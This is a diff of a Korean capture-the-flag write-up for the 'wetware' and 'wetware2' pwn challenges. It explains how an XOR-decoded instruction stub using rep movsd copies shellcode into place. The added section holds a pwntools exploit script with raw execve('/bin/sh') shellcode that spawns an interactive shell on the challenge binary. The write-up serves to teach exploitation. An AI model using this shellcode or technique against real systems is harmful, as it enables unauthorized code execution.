@@ -217,7 +217,7 @@ t.interactive()
 .text:000000000040018C                 jmp     short loc_40017B
 ```
 
-이 루틴으로 넘어온다. 0x4001cd ~0x400215안에 있는 바이트코드와 입력값 중 처음 6바이트만으로 xor을 1바이트씩 돌려서 새로운 인스트럭션을 만들어내는데 0x400215까지 돌고나면 0x4001cd로 jmp한다. nx비트가 없기 때문에 간단하게 쉘코드를 실행시킬 수 있다.
+이 루틴으로 넘어온다. 0x4001cd ~0x400215안에 있는 바이트코드와 입력값 중 처음 8바이트만으로 xor을 1바이트씩 돌려서 새로운 인스트럭션을 만들어내는데 0x400215까지 돌고나면 0x4001cd로 jmp한다. nx비트가 없기 때문에 간단하게 쉘코드를 실행시킬 수 있다.
 
 ```python
 from pwn import *
@@ -247,3 +247,57 @@ t.sendline(p)
 t.interactive()
 ```
 
+
+
+
+
+# wetware2
+
+wetware와 동일하다 다른 점은 nx비트가 걸려있다는 것, 그리고 8바이트에서 6바이트 xor로 바뀌었기 때문에 원하는 명령어는 6바이트만 사용 가능하다..
+
+결국 대회 끝나고 풀었는데.. 명령어들 검색해 보다가 rep를 찾았고 rep movsd가 딱 이 상황에 맞는 명령어였다!!!!!!!
+
+> rep movsd : esi 에 있는 값 4바이트를 edi에 복사함, ecx가 카운트
+
+해서 사용한건
+
+>    0:   b1 10                   mov    cl,0x10
+>    2:   f3 a5                   rep movs DWORD PTR es:[rdi],DWORD PTR ds:[rsi]
+>    4:   eb 4a                   jmp    0x50
+
+이렇게 썼다! rep가 실행되면 0x40021d에 쉘코드가 박히는데 jmp 0x40021d 만들려고 또 이것 저것...
+
+```python
+from pwn import *
+
+t = process('./wetware2')
+#t = remote('chal1.swampctf.com',1337)
+
+t.recvuntil(":")
+sc = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
+
+ssc = ('''
+	mov cl, 30
+	rep movsd
+	jmp rdi
+	''')
+
+asm_sc = asm(ssc,arch='amd64')
+
+print disasm(asm_sc,arch='amd64')
+
+print disasm("\xb1\x10\xf3\xa5\xeb\x4a",arch='amd64')
+
+# b140f3a5eb4a
+# p = asm_sc
+
+#p = "\xb1\x10\xf3\xa5\xeb\x4a"
+
+p = p64(0x90657b85cb9b7e64) + sc
+
+t.sendline(p)
+
+t.interactive()
+```
+
+으으 잘하고 싶다..
